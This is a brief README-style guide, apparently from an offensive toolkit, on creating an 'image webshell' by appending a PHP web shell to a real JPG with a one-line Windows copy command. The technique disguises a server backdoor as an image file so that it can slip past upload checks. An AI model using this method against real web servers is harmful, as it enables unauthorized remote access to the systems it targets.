## 0x00 General Overview

Image webshell is generated by attaching script codes on to a real image.

Take PHP as an example here.

### Replace Image

Get a prefered image you like and save in this directory as **img.jpg**

Run the following command in CMD or double click the batch file.

```bat
copy img.jpg/b + webshell.php test.jpg
```
